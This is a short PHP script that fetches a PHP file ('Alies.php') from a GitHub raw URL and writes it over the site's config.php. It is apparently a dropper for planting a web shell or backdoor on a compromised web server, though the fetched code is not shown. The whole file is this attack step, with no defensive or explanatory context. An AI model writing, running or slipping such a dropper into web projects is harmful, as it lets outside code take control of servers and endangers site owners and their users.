<?php
$make = fopen('config.php', 'w+');
$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/Alies.php');
fwrite($make, $get);
fclose($make);
?>
